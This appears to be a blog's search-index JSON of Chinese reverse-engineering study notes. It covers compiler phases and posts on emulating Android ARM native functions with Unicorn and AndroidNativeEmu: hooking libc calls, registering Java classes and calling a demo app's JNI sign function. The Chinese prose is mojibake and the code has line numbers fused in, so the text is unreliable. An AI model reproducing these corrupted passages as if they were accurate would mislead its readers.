ä¼˜åŒ–ï¼šæ¯æ¬¡ä¹˜å®é™…ä¸Šéƒ½æ˜¯åœ¨ä¸Šä¸€æ¬¡çš„åŸºç¡€æ˜¯+10,æ‰€ä»¥èƒ½å°†ä¹˜æ“ä½œä¼˜åŒ–æˆåŠ æ³•æ“ä½œï¼Œæ¥è¾¾åˆ°æå‡æ•ˆç‡çš„ç›®çš„ ç›®æ ‡ä»£ç ç”Ÿæˆ ä»»åŠ¡ï¼šæŠŠä¼˜åŒ–çš„ä¸­é—´ä»£ç è½¬åŒ–æˆç‰¹å®šæœºå™¨ä¸Šçš„ä½çº§è¯­è¨€ ç›®æ ‡æŒ‡ä»¤çš„å½¢å¼ï¼š ç»å¯¹æŒ‡ä»¤ä»£ç ï¼šå°±æ˜¯01010çš„æœºå™¨ä»£ç å¦‚exeæ–‡ä»¶ï¼Œå¯ç«‹å³æ‰§è¡Œ æ±‡ç¼–æŒ‡ä»¤ä»£ç ï¼šæ±‡ç¼–è¯­è¨€ç¨‹åºï¼Œéœ€è¦é€šè¿‡æ±‡ç¼–ç¨‹åºæ±‡ç¼–åæ‰èƒ½è¿è¡Œ å¯é‡å®šä½æŒ‡ä»¤ä»£ç ï¼šå…ˆå°†å„ç›®æ ‡æ¨¡å—è¿æ¥èµ·æ¥ï¼Œç¡®å®šå˜é‡ã€å¸¸æ•°åœ¨ä¸»å­˜ä¸­çš„ä½ç½®ï¼Œè£…å…¥ä¸»å­˜åæ‰èƒ½æˆä¸ºå¯ä»¥è¿è¡Œçš„ç»å¯¹æŒ‡ä»¤ä»£ç  è¡¨æ ¼ä¸è¡¨æ ¼ç®¡ç† è¡¨æ ¼ä½œç”¨ï¼šç”¨æ¥è®°å½•æºç¨‹åºçš„å„ç§ä¿¡æ¯ä»¥åŠç¼–è¯‘è¿‡ç¨‹ä¸­çš„å„ç§çŠ¶å†µ ä¸ç¼–è¯‘å‰ä¸‰é˜¶æ®µæœ‰å…³çš„è¡¨æ ¼ï¼š ç¬¦å·è¡¨ï¼šç”¨æ¥ç™»è®° æºç¨‹åºä¸­çš„å¸¸é‡åã€ å˜é‡åã€æ•°ç»„åã€ è¿‡ç¨‹åç­‰ï¼Œè®°å½•å®ƒ ä»¬çš„æ€§è´¨ã€å®šä¹‰å’Œå¼•ç”¨æƒ…å†µ å¸¸æ•°è¡¨ä¸æ ‡å·è¡¨ï¼šç™»è®°å„ç±»å¸¸æ•°å€¼ï¼Œç™»è®°æ ‡å·çš„å®šä¹‰ä¸ä½œç”¨ å…¥å£åè¡¨ï¼šç™»è®°è¿‡ç¨‹çš„å±‚å·ï¼Œåˆ†ç¨‹åºç¬¦å·è¡¨å…¥å£ ä¸­é—´ä»£ç è¡¨ å‡ºé”™ä¸å¤„ç†é”™è¯¯ç±»å‹: è¯­æ³•é”™è¯¯:åœ¨è¯æ³•åˆ†æå’Œè¯­æ³•åˆ†æé˜¶æ®µæ£€æµ‹å‡ºæ¥ è¯­ä¹‰é”™è¯¯ï¼šä¸€èˆ¬åœ¨è¯­ä¹‰åˆ†æé˜¶æ®µæ£€æµ‹ éï¼šæŒ‡å¯¹æºç¨‹åºæˆ–æºç¨‹åºçš„ä¸­é—´ç»“æœä»å¤´åˆ°å°¾æ‰« æä¸€æ¬¡ï¼Œå¹¶åšæœ‰å…³çš„åŠ å·¥å¤„ç†ï¼Œç”Ÿæˆæ–°çš„ä¸­é—´ç»“ æœæˆ–ç›®æ ‡ä»£ç çš„è¿‡ç¨‹ã€‚ ï¼ˆéä¸é˜¶æ®µçš„å«ä¹‰æ¯«æ— å…³ç³»ã€‚ï¼‰ ä¸€éæ‰«æ &#x3D;&#x3D;ä¸€éæ‰«æä¸æ˜¯ä¸€æ¬¡æ€§æ‰«æå’Œåˆ†æï¼Œè€Œæ˜¯é€šè¿‡ä¸€å¥ä¸€å¥çš„è¡¨æ ¼æ˜¯è¿›è¡Œåå¤æ‰«æå’Œåˆ†æ&#x3D;&#x3D; ç¼–è¯‘ç¨‹åºç”Ÿæˆç”Ÿæˆæ–¹å¼ï¼š ç›´æ¥ç”¨æœºå™¨è¯­è¨€ç¼–å†™ç¼–è¯‘ç¨‹åº ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™ç¼–è¯‘ç¨‹åº æ³¨ï¼šç¼–è¯‘ç¨‹åºæ ¸å¿ƒéƒ¨åˆ†å¸¸ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™ ç”¨é«˜çº§è¯­è¨€ç¼–å†™ç¼–è¯‘ç¨‹åºï¼šè¿™æ˜¯æ™®éé‡‡ç”¨çš„æ–¹æ³• .è‡ªç¼–è¯‘ï¼šå†…ç½®æ ¸å¿ƒç¼–è¯‘ç¨‹åºï¼Œå¦‚ä½•ç”¨è‡ªèº«çš„æ ¸å¿ƒç¨‹åºå»ç¼–è¯‘å…¶ä»–ç¨‹åº ç¼–è¯‘å·¥å…·ï¼šLEX(è¯æ³•åˆ†æ)ä¸YACC(ç”¨äºè‡ªåŠ¨äº§ç”ŸLALRåˆ†æ è¡¨) ç§»æ¤ï¼ˆåŒç§è¯­è¨€çš„ç¼–è¯‘ç¨‹åºåœ¨ä¸åŒç±»å‹çš„æœºå™¨ä¹‹ é—´ç§»æ¤ï¼‰ å†™ç¼–è¯‘ç¨‹åºçš„åŸºæœ¬æ¡ä»¶ï¼š æºç¨‹åºè¯­è¨€ ç›®æ ‡ç¨‹åºè¯­è¨€ ç¼–è¯‘æ–¹æ³•","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"ollvmåšæ³•","slug":"ollvmåšæ³•","date":"2023-01-02T14:06:24.000Z","updated":"2023-01-12T14:08:24.883Z","comments":true,"path":"2023/01/02/ollvmåšæ³•/","link":"","permalink":"https://pa1r0t.github.io/2023/01/02/ollvm%E5%81%9A%E6%B3%95/","excerpt":"unicorn start","text":"unicorn start ç›®æ ‡:å¤„ç†ollvmæ··æ·† ç”¨è„šæœ¬å¤„ç†è¯¥å‡½æ•°åœ¨è„šæœ¬ä¸­è®¾ç½®èµ·å§‹åœ°å€å’Œæ–‡ä»¶å ç„¶åæ‰§è¡Œè¯¥pythonæ–‡ä»¶","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"unicorn_learning4","slug":"unicorn-learning4","date":"2022-12-31T06:12:48.000Z","updated":"2022-12-31T08:10:21.907Z","comments":true,"path":"2022/12/31/unicorn-learning4/","link":"","permalink":"https://pa1r0t.github.io/2022/12/31/unicorn-learning4/","excerpt":"unicorn_starting æ¨¡æ‹ŸJniä¸Javaäº¤äº’","text":"unicorn_starting æ¨¡æ‹ŸJniä¸Javaäº¤äº’ ç›®æ ‡hookè¿™ä¸ªå‡½æ•°ï¼Œå…¶ä¸­å­˜åœ¨è°ƒç”¨javaç±»å’Œjavaå‡½æ•° å°è¯•å°†ä¸Šä¸€æ¬¡çš„ä»£ç è¿›è¡Œä¿®æ”¹åç›´æ¥æ‰§è¡Œï¼Œè§‚å¯Ÿç»“æœ æ³¨å†Œjavaç±»å’Œæ–¹æ³•ç»“æœå‘ç°ä¸èƒ½æ‰¾åˆ°javaè¿™ä¸ªç±»ï¼Œä¸‹é¢å·²ç»ç»™å‡ºç”³æ˜ï¼Œç›´æ¥å¤åˆ¶å³å¯ 12345class com_sec_udemo_MainActivity(metaclass=JavaClassDef, jvm_name=&quot;com/sec/udemo/MainActivity&quot;): def __init__(self): pass# æ·»åŠ è‡ªå®šä¹‰javaç±»emulator.java_classloader.add_class(com_sec_udemo_MainActivity) æ‰§è¡Œåå‘ç°åˆè¦å£°æ˜ç›¸å…³æ–¹æ³•: å£°æ˜æ–¹æ³•ï¼š 1234@java_method_def(name=&#x27;getSaltFromJava&#x27;,signature=&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;, args_list=[&#x27;jstring&#x27;],native=False) # è¿™é‡Œnative=Falseç”³æ˜æ­¤æ–¹æ³•énativeæ–¹æ³•def getSaltFromJava(self,mu,data): pass è¿™ä¸ªå‡½æ•°åœ¨javaä¸­çš„åŠŸèƒ½å¦‚ä¸‹ï¼š è¿™é‡Œæˆ‘ä»¬ä½œå‡ºæ‹¼æ¥è¿”å›å³å¯ æ‰§è¡Œåå†æ¬¡æŠ¥é”™ è¿™é‡Œæˆ‘ä»¬ç¼ºå°‘jobjectå¯¹è±¡ï¼Œè¿™é‡Œæˆ‘ä»¬æ‰‹åŠ¨åˆ›å»ºä¸€ä¸‹ï¼Œç„¶åä¼ å…¥è¿›å» 1234obj = com_sec_udemo_MainActivity()sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv3&#x27;, emulator.java_vm.jni_env.address_ptr,obj,&#x27;123&#x27;)print(sign) ç„¶åè¿™é‡Œåˆæœ‰ç›¸åŠ æ—¶å‡ºç°é”™è¯¯ è¿™é‡Œæˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹ï¼Œdataçš„å†…å®¹ï¼š ä¸€çœ‹æ˜¯java stringç±»å‹ï¼Œç±»å‹å±•å¼€å‘ç°valueä¸­valueå°±æ˜¯pythonçš„strç±»å‹ ä¿®æ”¹åæˆåŠŸå‡ºç»“æœï¼š å®Œæ•´ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990from unicorn import *import loggingimport sysfrom androidemu.java.helpers.native_method import native_methodfrom UnicornTraceDebugger import udbgfrom androidemu.emulator import Emulatorfrom androidemu.utils import memory_helpersfrom androidemu.java.java_classloader import JavaClassDeffrom androidemu.java.java_method_def import java_method_def# é…ç½®logginglogging.basicConfig( stream=sys.stdout, level=logging.DEBUG, format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot; )# ç”¨äºæ‰“å°è°ƒè¯•ä¿¡æ¯logger = logging.getLogger(__name__)class com_sec_udemo_MainActivity(metaclass=JavaClassDef, jvm_name=&quot;com/sec/udemo/MainActivity&quot;): def __init__(self): pass @java_method_def(name=&#x27;getSaltFromJava&#x27;,signature=&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;, args_list=[&#x27;jstring&#x27;],native=False) def getSaltFromJava(self,mu,data): print(&#x27;hello&#x27;) return data.value.value + &#x27;salt..&#x27;# æ ¹æ®æ‰§è¡Œå¤±è´¥çš„åº“å‡½æ•°ï¼Œè¿›è¡Œhookï¼Œç›´æ¥æœ¬åœ°å†™å‡½æ•°å®ç°ç›¸å…³åº“å‡½æ•°åŠŸèƒ½,é¦–å…ˆå¯¼å…¥ä¿®é¥°å™¨@native_methoddef __aeabi_memclr(mu,addr,size): mu.mem_write(addr,bytes(size)) print(&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27; % (addr,size))@native_methoddef __aeabi_memcpy(mu,dist,source,size): data = mu.mem_read(source,size) mu.mem_write(dist,bytes(data)) print(&#x27;__aeabi_memcpy (dist:%x,source:%x)&#x27; % (dist,source))@native_methoddef sprintf(mu,buffer,format,arg1,arg2): format1 = memory_helpers.read_utf8(mu,format) data1 = memory_helpers.read_utf8(mu,arg1) res = format1 % (data1,arg2) mu.mem_write(buffer,bytes((res+&#x27;\\x00&#x27;).encode(&#x27;utf-8&#x27;))) print(&#x27;sprintf (%s)&#x27; % (format))# åˆ›å»ºæ¨¡æ‹Ÿå™¨emulator = Emulator()# æ·»åŠ hook æ­¤å¤„å¿…é¡»åœ¨å¯¼å…¥soæ–‡ä»¶ä¹‹å‰å°±hookï¼Œå› ä¸ºæ­¤hookçš„æœ¬è´¨å°±æ˜¯hook gotè¡¨çš„å†…å®¹# åœ¨å¯¼å…¥soæ–‡ä»¶ä¹‹å‰hookæ‰ç”Ÿæ•ˆï¼Œå¯¼å…¥ä¹‹åæ²¡æ³•hookemulator.modules.add_symbol_hook(&#x27;__aeabi_memclr&#x27;, emulator.hooker.write_function(__aeabi_memclr) + 1)emulator.modules.add_symbol_hook(&#x27;__aeabi_memcpy&#x27;, emulator.hooker.write_function(__aeabi_memcpy) + 1)emulator.modules.add_symbol_hook(&#x27;sprintf&#x27;, emulator.hooker.write_function(sprintf) + 1)# æ·»åŠ è‡ªå®šä¹‰javaç±»emulator.java_classloader.add_class(com_sec_udemo_MainActivity)# åŠ è½½ç›¸å…³soæ–‡ä»¶# do_init å‚æ•°ä¸ºfalseï¼Œå³ä¸æ‰§è¡Œåˆå§‹åŒ–å‡½æ•°ï¼Œå› ä¸ºunicornä¸èƒ½å®ç°ç›¸å…³åˆå§‹åŒ–æ“ä½œï¼Œ# è¿™å¯èƒ½ä¼šæ¶‰åŠæ›´å¤šåº“çš„è°ƒç”¨emulator.load_library(&#x27;./lib/libc.so&#x27;,do_init=False)libnat_mod = emulator.load_library(&#x27;./lib/libnative-lib.so&#x27;,do_init=False)# æ‰§è¡ŒæŠ¥é”™æ—¶æ‰“å°è°ƒè¯•ä¿¡æ¯ï¼Œè·Ÿè¸ªæŠ¥é”™ä¸å®šä½å‘ç”ŸæŠ¥é”™çš„ç›¸å…³åœ°å€dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)# å¼€å§‹æ‰§è¡Œæƒ³è¦æ‰§è¡Œçš„jniå‡½æ•°try: # æ ¹æ®soæ¨¡å—è°ƒç”¨æŒ‡å®šçš„å‡½æ•°ï¼Œåé¢éƒ½æ˜¯å‡½æ•°çš„å‚æ•° # å‚æ•°1: JNIEnv # å‚æ•°2: æ˜¯javaç±»çš„å¯¹è±¡ï¼Œè¿™é‡Œå¡«0å³å¯ # å‚æ•°3: æ˜¯å‡½æ•°è¾“å…¥å­—ç¬¦ä¸² obj = com_sec_udemo_MainActivity() sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv3&#x27;, emulator.java_vm.jni_env.address_ptr,obj,&#x27;123&#x27;) print(sign)except UcError as e: # æ‰“å°è°ƒç”¨æ ˆ tracks = dbg.get_tracks() # è¿™é‡Œæ‰“å°è°ƒç”¨åœ°å€å³å¯ï¼Œæ‰“å°å100æ¡ for addr in tracks[-100:-1]: print(hex(addr - 0xcbc66000)) print(e)","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"unicorn_learning3","slug":"unicorn-learning3","date":"2022-12-31T01:12:04.000Z","updated":"2022-12-31T03:18:14.288Z","comments":true,"path":"2022/12/31/unicorn-learning3/","link":"","permalink":"https://pa1r0t.github.io/2022/12/31/unicorn-learning3/","excerpt":"unicorn start æ¨¡æ‹Ÿå™¨æ¡†æ¶è‡ªåŠ¨å¡«å……gotè¡¨é¡¹å†…å®¹","text":"unicorn start æ¨¡æ‹Ÿå™¨æ¡†æ¶è‡ªåŠ¨å¡«å……gotè¡¨é¡¹å†…å®¹ ç›®æ ‡hook JNIå‡½æ•° hook JNIå‡½æ•°çš„æ¡ä»¶ï¼š æ¡†æ¶ï¼š æ‰“å°è°ƒè¯•ä¿¡æ¯1234567891011import loggingimport sys# é…ç½®logginglogging.basicConfig( stream=sys.stdout, level=logging.debug, format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot; )# ç”¨äºæ‰“å°è°ƒè¯•ä¿¡æ¯logger = logging.getLogger(__name__) åˆ›å»ºæ¨¡æ‹Ÿå™¨+å¯¼å…¥soæ–‡ä»¶+æ‰§è¡Œç”¨å†™å¥½çš„æ¡†æ¶è¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œï¼Œä¸éœ€è¦è€ƒè™‘æ‰‹åŠ¨å¡«å……gotè¡¨é¡¹ 1234567891011121314151617181920# åˆ›å»ºæ¨¡æ‹Ÿå™¨emulator = Emulator()# åŠ è½½ç›¸å…³soæ–‡ä»¶# do_init å‚æ•°ä¸ºfalseï¼Œå³ä¸æ‰§è¡Œåˆå§‹åŒ–å‡½æ•°ï¼Œå› ä¸ºunicornä¸èƒ½å®ç°ç›¸å…³åˆå§‹åŒ–æ“ä½œï¼Œ# è¿™å¯èƒ½ä¼šæ¶‰åŠæ›´å¤šåº“çš„è°ƒç”¨emulator.load_library(&#x27;./lib/libc.so&#x27;,do_init=False)libnat_mod = emulator.load_library(&#x27;./lib/libnative-lib.so&#x27;,do_init=False)# å¼€å§‹æ‰§è¡Œæƒ³è¦æ‰§è¡Œçš„jniå‡½æ•°try: # æ ¹æ®soæ¨¡å—è°ƒç”¨æŒ‡å®šçš„å‡½æ•°ï¼Œåé¢éƒ½æ˜¯å‡½æ•°çš„å‚æ•° # å‚æ•°1: JNIEnv # å‚æ•°2: æ˜¯javaç±»çš„å¯¹è±¡ï¼Œè¿™é‡Œå¡«0å³å¯ # å‚æ•°3: æ˜¯å‡½æ•°è¾“å…¥å­—ç¬¦ä¸² sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv2&#x27;, emulator.java_vm.jni_env.address_ptr,0,&#x27;123&#x27;) print(sign)except UcError as e: print(e) è¿™é‡Œå‡ºç°libcçš„åŸºåœ°å€ è¿™é‡Œå‡ºç°libnative-lib.soçš„åŸºåœ°å€ã€‚3ï¼‰å¤„æœ‰æŠ¥é”™ï¼Œä½†åˆä¸çŸ¥é“å“ªé‡Œæœ‰é”™ è·Ÿè¸ªæŠ¥é”™ä¿¡æ¯æ‰“å°å¼‚å¸¸åœ°å€å’Œåœ°å€è°ƒç”¨æ ˆ,è¿™é‡Œæ‰“å°æœ€å100æ¡å³å¯,ç”¨udbgæ‰“å° 1234567891011121314151617181920# æ‰§è¡ŒæŠ¥é”™æ—¶æ‰“å°è°ƒè¯•ä¿¡æ¯ï¼Œè·Ÿè¸ªæŠ¥é”™ä¸å®šä½å‘ç”ŸæŠ¥é”™çš„ç›¸å…³åœ°å€dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)# å¼€å§‹æ‰§è¡Œæƒ³è¦æ‰§è¡Œçš„jniå‡½æ•°try: # æ ¹æ®soæ¨¡å—è°ƒç”¨æŒ‡å®šçš„å‡½æ•°ï¼Œåé¢éƒ½æ˜¯å‡½æ•°çš„å‚æ•° # å‚æ•°1: JNIEnv # å‚æ•°2: æ˜¯javaç±»çš„å¯¹è±¡ï¼Œè¿™é‡Œå¡«0å³å¯ # å‚æ•°3: æ˜¯å‡½æ•°è¾“å…¥å­—ç¬¦ä¸² sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv2&#x27;, emulator.java_vm.jni_env.address_ptr,0,&#x27;123&#x27;) print(sign)except UcError as e: # æ‰“å°è°ƒç”¨æ ˆ tracks = dbg.get_tracks() # è¿™é‡Œæ‰“å°è°ƒç”¨åœ°å€å³å¯ï¼Œæ‰“å°å100æ¡ for addr in tracks[-100:-1]: print(hex(addr - 0xcbc66000)) # æ³¨æ„è¿™é‡Œè¦å‡å»åŸºåœ°å€ print(e) è¿™é‡Œæœ‰å‡½æ•°å‚æ•°æç¤ºï¼š è¿™é‡Œæœ‰å‡ºç°è´Ÿåœ°å€ï¼Œè´Ÿåœ°å€å°±æ˜¯å‡½æ•°æ‰§è¡Œåˆ°libc.soæ–‡ä»¶ä¸­ï¼Œè¿™é‡Œç”±äºæ²¡æœ‰åˆå§‹åŒ–çš„ç¼˜æ•…ï¼Œå¯èƒ½libcä¸­éƒ¨åˆ†å‡½æ•°æ‰§è¡Œå¤±è´¥ï¼Œè¿™é‡Œæˆ‘ä»¬æ‰‹åŠ¨hookï¼Œ&#x3D;&#x3D;æœ¬è´¨æ˜¯hook gotè¡¨åœ°å€&#x3D;&#x3D; è¿™é‡Œæˆ‘ä»¬å®šä½åˆ°idaä¸­å‡ºé”™çš„åœ°å€ å‘ç°æ˜¯è¿™ä¸ªåº“å‡½æ•°æœ‰é—®é¢˜ã€‚é‚£å°±hookå®ƒ hookæ·»åŠ hook æ­¤å¤„å¿…é¡»åœ¨å¯¼å…¥soæ–‡ä»¶ä¹‹å‰å°±hookï¼Œåœ¨å¯¼å…¥soæ–‡ä»¶ä¹‹å‰hookæ‰ç”Ÿæ•ˆï¼Œå¯¼å…¥ä¹‹åæ²¡æ³•hook 123456789# æ ¹æ®æ‰§è¡Œå¤±è´¥çš„åº“å‡½æ•°ï¼Œè¿›è¡Œhookï¼Œç›´æ¥æœ¬åœ°å†™å‡½æ•°å®ç°ç›¸å…³åº“å‡½æ•°åŠŸèƒ½,é¦–å…ˆå¯¼å…¥ä¿®é¥°å™¨@native_methoddef __aeabi_memclr(mu,addr,size): print(&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27; % (addr,size)) # æ·»åŠ hook æ­¤å¤„å¿…é¡»åœ¨å¯¼å…¥soæ–‡ä»¶ä¹‹å‰å°±hookï¼Œå› ä¸ºæ­¤hookçš„æœ¬è´¨å°±æ˜¯hook gotè¡¨çš„å†…å®¹# åœ¨å¯¼å…¥soæ–‡ä»¶ä¹‹å‰hookæ‰ç”Ÿæ•ˆï¼Œå¯¼å…¥ä¹‹åæ²¡æ³•hookemulator.modules.add_symbol_hook(&#x27;__aeabi_memclr&#x27;, emulator.hooker.write_function(__aeabi_memclr) + 1) å…¶ä»–å‡½æ•°ä»¥æ­¤ç±»æ¨ å…³äºsprintfå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ˜¯a2ï¼Œå°±æ˜¯bufferåœ°å€ å…¨éƒ¨å‡½æ•°hookåï¼š è¿™é‡Œè¾“å‡ºæ˜¯ç©ºå› ä¸ºï¼Œæˆ‘ä»¬hookç›¸å…³å‡½æ•°è¿˜æœªåœ¨unicornä¸­å®ç°ï¼Œè¿™é‡Œæˆ‘ä»¬åšä¸ªå®ç°å³å¯ 123456789101112131415161718@native_methoddef __aeabi_memclr(mu,addr,size): mu.mem_write(addr,bytes(size)) print(&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27; % (addr,size))@native_methoddef __aeabi_memcpy(mu,dist,source,size): data = mu.mem_read(source,size) mu.mem_write(dist,bytes(data)) print(&#x27;__aeabi_memcpy (dist:%x,source:%x)&#x27; % (dist,source))@native_methoddef sprintf(mu,buffer,format,arg1,arg2): format1 = memory_helpers.read_utf8(mu,format) data1 = memory_helpers.read_utf8(mu,arg1) res = format1 % (data1,arg2) mu.mem_write(buffer,bytes((res+&#x27;\\x00&#x27;).encode(&#x27;utf-8&#x27;))) print(&#x27;sprintf (%s)&#x27; % (format)) è¿™é‡Œè¯´æ˜ä¸€ä¸‹bytes()å‡½æ•°æ”¾å…¥intå‹ä¼šè¾“å‡ºä»€ä¹ˆï¼š æœ€ç»ˆç»“æœï¼š å…¨éƒ¨ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from unicorn import *import loggingimport sysfrom androidemu.java.helpers.native_method import native_methodfrom UnicornTraceDebugger import udbgfrom androidemu.emulator import Emulatorfrom androidemu.utils import memory_helpers# é…ç½®logginglogging.basicConfig( stream=sys.stdout, level=logging.DEBUG, format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot; )# ç”¨äºæ‰“å°è°ƒè¯•ä¿¡æ¯logger = logging.getLogger(__name__)# æ ¹æ®æ‰§è¡Œå¤±è´¥çš„åº“å‡½æ•°ï¼Œè¿›è¡Œhookï¼Œç›´æ¥æœ¬åœ°å†™å‡½æ•°å®ç°ç›¸å…³åº“å‡½æ•°åŠŸèƒ½,é¦–å…ˆå¯¼å…¥ä¿®é¥°å™¨@native_methoddef __aeabi_memclr(mu,addr,size): mu.mem_write(addr,bytes(size)) print(&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27; % (addr,size))@native_methoddef __aeabi_memcpy(mu,dist,source,size): data = mu.mem_read(source,size) mu.mem_write(dist,bytes(data)) print(&#x27;__aeabi_memcpy (dist:%x,source:%x)&#x27; % (dist,source))@native_methoddef sprintf(mu,buffer,format,arg1,arg2): format1 = memory_helpers.read_utf8(mu,format) data1 = memory_helpers.read_utf8(mu,arg1) res = format1 % (data1,arg2) mu.mem_write(buffer,bytes((res+&#x27;\\x00&#x27;).encode(&#x27;utf-8&#x27;))) print(&#x27;sprintf (%s)&#x27; % (format))# åˆ›å»ºæ¨¡æ‹Ÿå™¨emulator = Emulator()# æ·»åŠ hook æ­¤å¤„å¿…é¡»åœ¨å¯¼å…¥soæ–‡ä»¶ä¹‹å‰å°±hookï¼Œå› ä¸ºæ­¤hookçš„æœ¬è´¨å°±æ˜¯hook gotè¡¨çš„å†…å®¹# åœ¨å¯¼å…¥soæ–‡ä»¶ä¹‹å‰hookæ‰ç”Ÿæ•ˆï¼Œå¯¼å…¥ä¹‹åæ²¡æ³•hookemulator.modules.add_symbol_hook(&#x27;__aeabi_memclr&#x27;, emulator.hooker.write_function(__aeabi_memclr) + 1)emulator.modules.add_symbol_hook(&#x27;__aeabi_memcpy&#x27;, emulator.hooker.write_function(__aeabi_memcpy) + 1)emulator.modules.add_symbol_hook(&#x27;sprintf&#x27;, emulator.hooker.write_function(sprintf) + 1)# åŠ è½½ç›¸å…³soæ–‡ä»¶# do_init å‚æ•°ä¸ºfalseï¼Œå³ä¸æ‰§è¡Œåˆå§‹åŒ–å‡½æ•°ï¼Œå› ä¸ºunicornä¸èƒ½å®ç°ç›¸å…³åˆå§‹åŒ–æ“ä½œï¼Œ# è¿™å¯èƒ½ä¼šæ¶‰åŠæ›´å¤šåº“çš„è°ƒç”¨emulator.load_library(&#x27;./lib/libc.so&#x27;,do_init=False)libnat_mod = emulator.load_library(&#x27;./lib/libnative-lib.so&#x27;,do_init=False)# æ‰§è¡ŒæŠ¥é”™æ—¶æ‰“å°è°ƒè¯•ä¿¡æ¯ï¼Œè·Ÿè¸ªæŠ¥é”™ä¸å®šä½å‘ç”ŸæŠ¥é”™çš„ç›¸å…³åœ°å€dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)# å¼€å§‹æ‰§è¡Œæƒ³è¦æ‰§è¡Œçš„jniå‡½æ•°try: # æ ¹æ®soæ¨¡å—è°ƒç”¨æŒ‡å®šçš„å‡½æ•°ï¼Œåé¢éƒ½æ˜¯å‡½æ•°çš„å‚æ•° # å‚æ•°1: JNIEnv # å‚æ•°2: æ˜¯javaç±»çš„å¯¹è±¡ï¼Œè¿™é‡Œå¡«0å³å¯ # å‚æ•°3: æ˜¯å‡½æ•°è¾“å…¥å­—ç¬¦ä¸² sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv2&#x27;, emulator.java_vm.jni_env.address_ptr,0,&#x27;123&#x27;) print(sign)except UcError as e: # æ‰“å°è°ƒç”¨æ ˆ tracks = dbg.get_tracks() # è¿™é‡Œæ‰“å°è°ƒç”¨åœ°å€å³å¯ï¼Œæ‰“å°å100æ¡ for addr in tracks[-100:-1]: print(hex(addr - 0xcbc66000)) print(e)","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"unicorn_learning2","slug":"unicorn-learning2","date":"2022-12-30T01:40:33.000Z","updated":"2022-12-30T07:24:54.480Z","comments":true,"path":"2022/12/30/unicorn-learning2/","link":"","permalink":"https://pa1r0t.github.io/2022/12/30/unicorn-learning2/","excerpt":"unicorn start ç”¨unicornè°ƒç”¨soæ–‡ä»¶ä¸­çš„æŸä¸ªå‡½æ•°ï¼Œè§‚å¯Ÿå‡½æ•°çš„è¾“å…¥ä¸è¾“å‡º","text":"unicorn start ç”¨unicornè°ƒç”¨soæ–‡ä»¶ä¸­çš„æŸä¸ªå‡½æ•°ï¼Œè§‚å¯Ÿå‡½æ•°çš„è¾“å…¥ä¸è¾“å‡º ç›®æ ‡hook soæ–‡ä»¶ä¸­çš„sign1å‡½æ•°çš„è¾“å‡ºä¸è¾“å…¥ è¿™ä¸ªå‡½æ•°å†…éƒ¨è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œtea_encryptå’Œsprintfï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ä¸­tea_encryptå‡½æ•°åªéœ€è¦ä¿®å¤gotè¡¨é¡¹å³å¯è°ƒç”¨tea_encryptï¼Œä½†æ˜¯sprintfå‡½æ•°ä¸è¡Œ è¿™é‡Œæˆ‘ä»¬å¼€å§‹å®éªŒ åˆ›å»ºè™šæ‹Ÿæœºç”±äºè¿™é‡Œçš„æŒ‡ä»¤éƒ½æ˜¯ä¸¤ä¸ªå­—èŠ‚ä¸ºä¸€æ¡æŒ‡ä»¤ æ‰€ä»¥è¿™é‡Œä¸ºthumbæŒ‡ä»¤é›† 1234567891011def test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB) # åˆ›å»ºä»£ç  # å…¶å®ƒä»£ç æ·»åŠ åˆ°æ­¤å¤„ return mu except UcError as e: print(&quot;ERROR: %s&quot; % e)mu = test_arm() # muå°±æ˜¯armè™šæ‹Ÿæœº å»ºç«‹å†…å­˜æ˜ å°„+å†™å…¥æ•°æ®ç”±äºè¿™æ˜¯è¦æ¨¡æ‹Ÿæ‰§è¡Œä¸€æ®µå‡½æ•°ï¼Œæ‰€ä»¥è¦å»ºç«‹é•œåƒåŒºï¼Œæ ˆåŒºï¼Œæ•°æ®æ®µåŒºçš„å†…å­˜ è¿™é‡Œå„ä¸ªåŒºçš„å¤§å°å­˜ç²¹é ä¼°ç®— 12345678910111213141516171819image = open(&#x27;./libnative-lib.so&#x27;,&#x27;rb&#x27;).read()# é•œåƒå†…å­˜image_base = 0x0mu.mem_map(image_base, 0x10000*8) # 